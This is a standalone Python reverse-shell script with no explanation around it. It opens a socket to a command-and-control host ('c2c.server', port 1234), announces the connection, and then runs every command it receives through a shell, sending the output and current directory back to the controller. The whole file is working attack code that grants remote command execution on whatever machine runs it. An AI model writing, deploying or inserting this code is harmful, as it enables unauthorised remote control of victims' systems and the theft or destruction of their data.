#!/usr/bin/python3
# -*- coding: utf-8 -*-

import socket, subprocess, os, sys

Address = "c2c.server"
Port = 1234
sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.connect((Address, Port))
sock.send('Established'.encode())


while True:
	command = sock.recv(1024)

	if command == b'exit\n':
		sock.close
		sys.exit(0)

	else:
		process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		if command[:2] == b'cd':
			if os.path.exists(command[3:].replace(b'\n', b'')):
				os.chdir(command[3:].replace(b'\n', b''))
		else:
			out = process.stdout.read() + process.stderr.read()
		sock.send(out + os.getcwd().encode() +  b'> ')
